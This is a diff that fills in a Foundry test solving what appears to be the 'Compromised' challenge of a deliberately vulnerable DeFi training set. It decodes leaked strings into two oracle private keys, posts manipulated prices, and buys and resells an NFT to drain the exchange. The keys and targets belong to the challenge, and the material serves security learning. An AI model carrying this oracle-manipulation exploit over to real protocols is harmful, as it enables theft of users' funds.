@@ -75,7 +75,76 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        console.log("### test_compromised START ###");
+        startHoax(player);
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("player balance:", player.balance);
+        console.log("exchange balance:", address(exchange).balance);
+        console.log("DVNFT price:", oracle.getMedianPrice("DVNFT"));
+        console.log("nft symbol:", nft.symbol());
+
+        console.log("");
+        console.log("#2 Run attack");
+        // 1. Post extremely low price to the oracle (0 ETH)
+        attack_oracle(0);
+        // 2. Buy NFT at a very low price
+        uint256 _id = exchange.buyOne{value: 0.01 ether}();
+        console.log("Token ID bought:", _id);
+
+        // 3. Post extremely high price to the oracle (exchange initial balance)
+        attack_oracle(INITIAL_NFT_PRICE);
+        nft.approve(address(exchange), _id);
+        // 4. Sell the NFT at a INITIAL_NFT_PRICE
+        exchange.sellOne(_id);
+
+        (bool success, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "Transfer failed");
+
+        console.log("");
+        vm.stopPrank();
+        console.log("### test_compromised END ###");
+    }
+
+    function attack_oracle(uint256 _price) private{
+        /*
+         * ascii string:
+         * 4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
+         *
+         * Base64 string:
+         * TUhnM1pERTFZbUpoTWpaak5USXpOamd6WW1aak0yUmpOMk5rWXpWa01XSTRZVEkzTkRRME5EYzFPVGRqWmpSa1lURTNNRFZqWmpaak9Ua3pNRFl6TnpRMA
+         *
+         * private key1: 
+         * 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+         */
+        bytes32 key1 = hex"7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744";
+        address addr1 = vm.addr(uint256(key1));
+        console.log("Address from key1:", addr1);
+
+        /*
+         * ascii string:
+         * 4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535
+         *
+         * Base64 string:
+         * MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5
+
+         *
+         * private key2: 
+         * 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+         */
+        bytes32 key2 = hex"68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159";
+        address addr2 = vm.addr(uint256(key2));
+        console.log("Address from key2:", addr2);
+
+        startHoax(addr1);
+        oracle.postPrice("DVNFT", _price);
+
+        startHoax(addr2);
+        oracle.postPrice("DVNFT", _price);
+
+        startHoax(player);
+        console.log("DVNFT price now:", oracle.getMedianPrice("DVNFT")/1 ether);
     }
 
     /**
